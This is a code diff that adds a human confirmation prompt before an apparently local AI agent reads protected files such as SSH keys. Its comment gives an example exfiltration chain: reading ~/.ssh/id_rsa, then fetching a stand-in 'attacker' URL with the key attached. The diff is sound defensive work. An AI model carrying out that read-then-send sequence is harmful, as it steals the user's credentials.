@@ -27,8 +27,27 @@ def read_file_content(path):
         if not os.path.exists(full_path):
             return f"Error: File not found: {path}"
 
-        # Basic security check - prevent reading outside of home/project if needed
-        # For now, we trust the agent as it's running locally under user permissions
+        # Protected-path gate — always prompts, in every permission mode.
+        #
+        # WRITE_FILE/EDIT_FILE have gated protected paths for a while; READ_FILE
+        # did not, on the reasoning that a read is harmless. It isn't: the agent
+        # also has outbound-fetch tools, so "read ~/.ssh/id_rsa" followed by
+        # "DEEP_INGEST http://attacker/?d=<key>" is a complete exfiltration
+        # primitive, and neither step used to ask. Reading a protected file is
+        # the first half of that, so it asks now. Ordinary reads are untouched.
+        protected, protect_reason = _is_protected_path(full_path)
+        if protected:
+            state.print_colored(f"\nAgent wants to read file: {full_path}", state.colors['FAIL'])
+            state.print_colored(f"   WARNING: {protect_reason}", state.colors['FAIL'])
+            try:
+                choice = input(
+                    f"{state.colors['BOLD']}Allow read of PROTECTED path? [y/N] > {state.colors['ENDC']}"
+                )
+            except (EOFError, KeyboardInterrupt):
+                return "User cancelled read of protected path."
+            if choice.lower() != 'y':
+                state.logger.info("Read of protected path denied: %s — %s", full_path, protect_reason)
+                return f"Denied: {protect_reason}"
 
         with open(full_path, 'r', encoding='utf-8', errors='replace') as f:
             content = f.read()
